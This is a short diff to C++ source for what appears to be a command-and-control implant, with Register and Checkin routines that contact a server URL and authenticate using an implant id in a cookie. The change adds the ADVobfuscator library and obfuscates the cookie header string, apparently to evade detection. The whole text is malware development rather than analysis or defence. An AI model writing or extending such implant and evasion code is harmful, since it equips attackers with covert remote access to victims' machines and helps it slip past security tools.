@@ -14,6 +14,8 @@
 #include <iostream>
 
 using namespace std;
+using namespace andrivet::ADVobfuscator;
+
 
 MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string privKey)
 {
@@ -62,7 +64,7 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     // sprintf(authCookieString, "Cookie: %s=%s", profile->cookie.c_str(), profile->implantId.c_str());
     // cout << authCookieString << endl;
     std::ostringstream oss;
-    oss << "Cookie: " << profile->cookie << "=" << profile->implantId;
+    oss << OBFUSCATED("Cookie: ") << profile->cookie << "=" << profile->implantId;
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
     DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
